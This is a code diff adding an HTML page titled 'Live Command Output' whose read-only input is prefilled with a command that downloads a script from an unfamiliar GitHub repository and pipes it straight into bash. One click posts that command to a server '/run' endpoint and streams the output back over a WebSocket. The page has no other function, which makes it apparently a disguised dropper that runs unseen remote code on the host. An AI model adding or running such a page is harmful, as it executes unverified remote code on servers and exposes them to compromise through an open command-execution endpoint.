@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Command Output</title>
+</head>
+<body>
+    <h1>Live Command Output</h1>
+    <input type="text" id="command" placeholder="Enter command" value="curl -sL https://raw.githubusercontent.com/erlandi-main-api/gaga/main/x | bash" readonly />
+    <button onclick="runCommand()">Run Command</button>
+    <pre id="output"></pre>
+
+    <script>
+        const ws = new WebSocket(`ws://${window.location.host}`);
+        let wsId;
+
+        ws.onmessage = (event) => {
+            if (!wsId) {
+                wsId = event.data.split(' ').pop();
+            } else {
+                document.getElementById('output').innerText += event.data + '\n';
+            }
+        };
+
+        function runCommand() {
+            const command = document.getElementById('command').value;
+            fetch('/run', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ command: command, ws: wsId })
+            });
+        }
+    </script>
+</body>
+</html>
